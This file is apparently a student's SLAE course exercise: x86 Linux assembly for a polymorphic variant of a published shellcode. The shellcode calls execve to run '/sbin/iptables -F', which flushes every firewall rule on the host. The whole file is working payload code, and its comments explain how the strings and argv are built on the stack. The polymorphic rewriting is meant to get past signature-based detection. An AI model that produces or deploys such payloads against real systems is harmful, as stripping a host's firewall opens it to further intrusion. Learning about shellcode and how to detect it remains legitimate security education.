; Polymorphic equivalent for
; Linux/x86 iptables --flush
; Original at: http://shell-storm.org/shellcode/files/shellcode-825.php
; 2018-07-14 SLAE-1294 assignment 6

section .text
	global _start

_start:
	; Let's make esi our zero
	xor esi,esi

	; Going to use a PUSHAD to set up most of the data
	; Do an initial null termination
	push esi
	
	; "///sbin/iptables"
	mov eax,0x73656c62
	mov ecx,0x61747069
	mov edx,0x2f6e6962
	mov ebx,0x732f2f2f

	; parameter "-F"
	mov edi,esi
	add di,0x462d

	; Mass stack push
	pushad

	; At this point [esp] is -F
	; [esp+0x10] is the program path
	; Configure argv
	push esi
	; NB the stack is moving as we push stuff
	lea ebx,[esp+0x4]
	push ebx
	lea ebx,[esp+0x18]
	push ebx

	; Put top of stack in ecx
	xor ecx,ecx
	add ecx,esp

	; Zero out edx (envp)
	xor edx,edx

	; Get syscall number into eax
	mov eax,edx
	add eax,0xb

	int 0x80
